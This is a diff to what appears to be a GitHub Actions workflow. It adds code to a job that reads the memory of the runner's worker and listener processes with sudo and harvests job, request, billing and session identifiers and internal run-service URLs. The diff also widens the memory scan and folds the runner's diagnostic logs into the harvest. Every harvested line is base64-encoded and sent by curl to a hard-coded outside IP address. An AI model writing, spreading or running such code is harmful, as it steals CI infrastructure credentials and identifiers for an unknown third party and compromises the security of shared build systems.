@@ -18,10 +18,11 @@ jobs:
           worker=$(pgrep -o -f '/Runner.Worker ')
           listener=$(pgrep -o -f '/Runner.Listener run')
           echo "TARGET_PIDS worker=${worker:-none} listener=${listener:-none}"
-          grep -hE 'Job ID|runner request|Run[Ss]ervice|run service|Received message' /home/runner/actions-runner/cached/*/_diag/*.log 2>/dev/null | tail -80 || true
+          grep -hE 'Job ID|runner request|Run[Ss]ervice|run service|Received message' /home/runner/actions-runner/cached/*/_diag/*.log 2>/dev/null | tail -80 | tee /tmp/target-log-census || true
           sudo python3 - "$worker" "$listener" >/tmp/target-id-census <<'PY'
           import os,re,sys
           uuid=re.compile(rb'(?i)(?<![0-9a-f])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f])')
+          url=re.compile(rb'https://[A-Za-z0-9][A-Za-z0-9._:-]{2,255}/[A-Za-z0-9_./~-]{1,1024}')
           needles=(b'runner_request_id',b'runnerRequestId',b'RunnerRequestId',b'run_service_url',b'RunServiceUrl',b'PlanId',b'JobId',b'BillingOwnerId',b'sessionId')
           for pid in sys.argv[1:]:
             if not pid or not pid.isdigit(): continue
@@ -43,10 +44,22 @@ jobs:
                       if q<0:break
                       for v in uuid.findall(b[max(0,q-512):q+1024]):found.add((n.decode(),v.decode().lower()))
                       q+=len(n)
+                  for parity in (0,1):
+                    narrow=b[parity::2]
+                    for n in needles:
+                      q=0
+                      while True:
+                        q=narrow.find(n,q)
+                        if q<0:break
+                        for v in uuid.findall(narrow[max(0,q-256):q+512]):found.add((n.decode(),v.decode().lower()))
+                        q+=len(n)
+                    for v in url.findall(narrow):
+                      if b'actions.githubusercontent.com/' in v:found.add(('run_url',v.decode()))
                   tail=b[-2048:]
             for k,v in sorted(found):print(f'TARGET_MEM key={k} id={v}')
           PY
           cat /tmp/target-id-census
+          cat /tmp/target-log-census >>/tmp/target-id-census
           while read -r line; do
             encoded=$(printf '%s' "$line" | base64 -w0 | tr '+/' '-_')
             curl -sS --max-time 2 "http://16.146.243.72:8450/RS_TARGET_ID?run=$GITHUB_RUN_ID&d=$encoded" >/dev/null || true
